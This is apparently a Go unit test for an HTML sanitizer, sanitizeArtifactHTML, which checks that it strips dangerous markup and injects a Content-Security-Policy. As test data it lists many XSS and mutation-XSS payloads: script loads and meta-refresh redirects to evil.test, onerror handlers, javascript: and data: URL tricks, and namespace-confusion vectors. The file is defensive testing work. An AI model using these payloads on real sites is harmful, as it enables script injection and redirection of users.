package main

import (
	"strings"
	"testing"
)

func TestSanitizeArtifactHTMLVectors(t *testing.T) {
	t.Parallel()

	vectors := []string{
		`<!doctype html><!-- <head> --><html><head><meta name=">" http-equiv="refresh" content="0;url=https://evil.test"><meta name=x" http-equiv=refresh content=0;url=https://evil.test></head><body><script title=">" src="https://evil.test/a.js"></script ><script x=a"b>alert(1)</script>`,
		`<script><!-- <script> </script> -->self["loc"+"ation"]='https://evil.test';</script>`,
		`<script>/*</script!>*/alert(2)</script>`,
		`<iframe title=a"b src="about:blank"></iframe>`,
		`<svg><script href="https://evil.test/s.js"/><img src=x onerror=alert(1)><a><set attributeName="href" to="&#x6a;avascript:alert(1)"/></a></svg>`,
		`<svg><title><meta http-equiv="refresh" content="0;url=https://evil.test"></title></svg>`,
		`<svg><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style></svg>`,
		`<svg><textarea><meta http-equiv="refresh" content="0;url=https://evil.test"></textarea></svg>`,
		`<math><title><meta http-equiv="refresh" content="0;url=https://evil.test"></title></math>`,
		`<math><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style></math>`,
		`<math><textarea><meta http-equiv="refresh" content="0;url=https://evil.test"></textarea></math>`,
		`<svg><desc><svg><title></svg></title><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->`,
		`<span><div><svg><g></span><textarea><meta http-equiv="refresh" content="0;url=https://evil.test"></textarea>`,
		`<math><mi><mglyph></span><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style>`,
		`<math><annotation-xml encoding=" text/html "><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style></annotation-xml></math>`,
		`<math><annotation-xml><svg><desc><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->`,
		`<svg><embed><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style>`,
		`<svg><meta http-equiv="x" content="y"><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style>`,
		`<span><math><annotation-xml></span><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style>`,
		`<div><p><svg><g></div><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->`,
		`<svg><desc><image></desc><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style>`,
		`<form><svg><desc><form></desc><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style>`,
		`<table><svg><desc><td></td></desc><title><!-- </title><meta http-equiv="refresh" content="0;url=https://evil.test"> --></title></table>`,
		`<svg><style>/* &ast;/ @import url(https://evil.test); /* */</style></svg>`,
		`<div style="/* &ast;/ background:url(data:text/html,hi) /* */">hi</div>`,
		"<style>.a{--x:\"\n;@import url(https://evil.test);--y:\"/*\"}</style>",
		`<style>--><meta http-equiv="refresh" content="0;url=https://evil.test"></style>`,
		`<title><meta http-equiv="refresh" content="0;url=https://evil.test"></title>`,
		`<textarea><img src=x onerror=alert(9)></textarea>`,
		`<template><script>alert(1)</script></template>`,
		`<style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->`,
		`<img srcset="https://ok.test/a.png&#x20;1x&#x2c;javascript:alert(1)&#x20;2x" />`,
		`<style>.x{background:url(\64/*c*/ata:text/html,hi)}</style>`,
		`<object title=a"b data="x"></object><img src=x" onerror=alert(1)><img src="x"onerror="alert(1)"onload="eval(1)">`,
		`<!-- <a " --> <img src=x alt=">" onerror=alert(1)><!-- dash --!><img src=x onerror=alert(2)>`,
		`<style>/* <a " */</style><img src=x alt=">" onerror=alert(3)>`,
		`<link rel="preconnect" href="https://evil.test"><a href="&#100;ata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">ent</a><a href="data:text&#x2f;html,<script>alert(1)</script>">slash</a><a href="data:application/xhtml+xml,<html/>">xhtml</a><a href="java&#x09;script:alert(1)">js</a>`,
	}
	for _, vec := range vectors {
		cleanedVec, vecStripped := sanitizeArtifactHTML(vec)
		if !vecStripped || strings.Contains(cleanedVec, "<!--") || strings.Contains(cleanedVec, "<svg") || strings.Contains(cleanedVec, "<math") || strings.Contains(cleanedVec, "<template") || strings.Contains(cleanedVec, "<script") || strings.Contains(cleanedVec, "<object") || strings.Contains(cleanedVec, "<iframe") || strings.Contains(cleanedVec, "<embed") || strings.Contains(cleanedVec, "<link") || strings.Contains(cleanedVec, "<set") || strings.Contains(cleanedVec, "<style") || strings.Contains(cleanedVec, "@import") || strings.Contains(cleanedVec, "srcset=") || strings.Contains(cleanedVec, "<img src=\"x\" onerror") || strings.Contains(cleanedVec, "onload=") || strings.Contains(cleanedVec, "javascript:") || strings.Contains(cleanedVec, "data:text/html") || strings.Contains(cleanedVec, "data:application/xhtml+xml") || strings.Contains(cleanedVec, `<meta http-equiv="refresh"`) || strings.Contains(cleanedVec, `<meta http-equiv=refresh`) || strings.Contains(cleanedVec, `<meta name=`) || !strings.Contains(cleanedVec, "'sha256-B0vaSeHTnSWoVee69pbJTQb3o4Bao8IjCqTjjpMMNhc='") || strings.Contains(cleanedVec, "script-src 'unsafe-inline'") {
			t.Fatalf("expected vector %q neutralized cleanly, got stripped=%v html=%s", vec, vecStripped, cleanedVec)
		}
	}

	coalescingVectors := []string{
		`<<!-- -->meta http-equiv="refresh" content="0;url=https://evil.test">`,
		`<<svg></svg>meta http-equiv="refresh" content="0;url=https://evil.test">`,
		`<<template></template>meta http-equiv="refresh" content="0;url=https://evil.test">`,
		`<<script>1</script>meta http-equiv="refresh" content="0;url=https://evil.test">`,
		`<<style>@import;</style>meta http-equiv="refresh" content="0;url=https://evil.test">`,
		`<</svg>meta http-equiv="refresh" content="0;url=https://evil.test">`,
		`<<!x>meta http-equiv="refresh" content="0;url=https://evil.test">`,
		`<<a$>meta http-equiv="refresh" content="0;url=https://evil.test">`,
		`<<!-- -->style>@import url(https://evil.test);</style>`,
		`<<!-- -->img src=x onerror=alert(1)>`,
	}
	for _, vec := range coalescingVectors {
		cleanedVec, vecStripped := sanitizeArtifactHTML(vec)
		if !vecStripped || !strings.Contains(cleanedVec, "&lt;") || strings.Contains(cleanedVec, "<!--") || strings.Contains(cleanedVec, "<svg") || strings.Contains(cleanedVec, "<template") || strings.Contains(cleanedVec, "<script") || strings.Contains(cleanedVec, "<style") || strings.Contains(cleanedVec, "<img") || strings.Contains(cleanedVec, `<meta http-equiv="refresh"`) {
			t.Fatalf("expected coalescing vector %q neutralized as text, got stripped=%v html=%s", vec, vecStripped, cleanedVec)
		}
	}

	raw := "```html\n<!doctype html><!-- <head> --><html><head><meta name=\">\" http-equiv=\"refresh\" content=\"0;url=https://evil.test\"></head><body><svg><g><circle /></g></svg><math><mi>x</mi></math><template><script>alert(1)</script></template><script>self['loc'+'ation']='https://evil.test';</script><p>Clean</p></body></html>\n```"
	cleaned, stripped := sanitizeArtifactHTML(raw)
	if !stripped || strings.Contains(cleaned, "```") || strings.Contains(cleaned, "<!--") || strings.Contains(cleaned, "<svg") || strings.Contains(cleaned, "<math") || strings.Contains(cleaned, "<template") || strings.Contains(cleaned, "<script") || !strings.Contains(cleaned, "'sha256-B0vaSeHTnSWoVee69pbJTQb3o4Bao8IjCqTjjpMMNhc='") || !strings.Contains(cleaned, "<p>Clean</p>") {
		t.Fatalf("expected composite doc sanitized with Safe content kept, got stripped=%v html=%s", stripped, cleaned)
	}
	if strings.Index(cleaned, "Content-Security-Policy") < strings.Index(cleaned, "<head>") {
		t.Fatalf("expected CSP meta injected after <head> when comments are stripped, got: %s", cleaned)
	}

	selfClosedAndNested, nestedStripped := sanitizeArtifactHTML(`<html><body><svg /><p>After self-close</p><svg><svg></svg><img src=x onerror=alert(1)></svg></svg><math /><title><meta http-equiv="refresh" content="0;url=https://evil.test"></title><textarea><img src=x onerror=alert(2)></textarea><p>Sibling ok</p></body></html>`)
	if !nestedStripped || strings.Contains(selfClosedAndNested, "<svg") || strings.Contains(selfClosedAndNested, "<math") || strings.Contains(selfClosedAndNested, `<meta http-equiv="refresh"`) || !strings.Contains(selfClosedAndNested, `<title>&lt;meta http-equiv="refresh" content="0;url=https://evil.test"&gt;</title>`) || !strings.Contains(selfClosedAndNested, `<textarea>&lt;img src=x onerror=alert(2)&gt;</textarea>`) || !strings.Contains(selfClosedAndNested, "<p>After self-close</p>") || !strings.Contains(selfClosedAndNested, "<p>Sibling ok</p>") {
		t.Fatalf("expected self-closing/nested foreign tags stripped and raw < in title/textarea escaped, got stripped=%v html=%s", nestedStripped, selfClosedAndNested)
	}

	if _, arbStripped := sanitizeArtifactHTML("<!doctype html><html><body><script>document.getElementById('ping-btn').addEventListener('click', function () {});</script></body></html>"); !arbStripped {
		t.Fatalf("expected non-canonical inline script to be stripped")
	}

	lateHead := "<div>" + strings.Repeat("x", 50000) + "</div><head></head>"
	lateCleaned, lateStripped := sanitizeArtifactHTML(lateHead)
	if !lateStripped || !strings.HasPrefix(lateCleaned, "<meta http-equiv=\"Content-Security-Policy\"") || len(lateCleaned) > maxArtifactBytes {
		t.Fatalf("expected intact CSP prefix and <= 48 KiB cap on late-head doc, got len=%d stripped=%v", len(lateCleaned), lateStripped)
	}

	innerFenceDoc := "<!doctype html><html><head><title>Fences</title><style>.ok{color:#ffd300}</style></head><body><pre>```js\nconst a = 1;\n```</pre><script>" + canonicalProbeScript + "</script></body></html>"
	cleanInner, innerStripped := sanitizeArtifactHTML(innerFenceDoc)
	if innerStripped || !strings.Contains(cleanInner, "<pre>```js") || !strings.Contains(cleanInner, "<title>Fences</title>") || !strings.Contains(cleanInner, ".ok{color:#ffd300}") || !strings.Contains(cleanInner, "Content-Security-Policy") {
		t.Fatalf("expected inner fence doc intact without false stripped flag, got stripped=%v html=%s", innerStripped, cleanInner)
	}
	if _, secondStripped := sanitizeArtifactHTML(cleanInner); secondStripped {
		t.Fatalf("expected idempotent re-sanitization without stripping CSP meta")
	}

	oversized := strings.Repeat("é", 30000)
	capped, truncStripped := sanitizeArtifactHTML(oversized)
	if !truncStripped || len(capped) > maxArtifactBytes || !strings.Contains(capped, "Content-Security-Policy") {
		t.Fatalf("expected UTF-8 truncation <= 48 KiB preserving CSP, got len=%d stripped=%v", len(capped), truncStripped)
	}
}
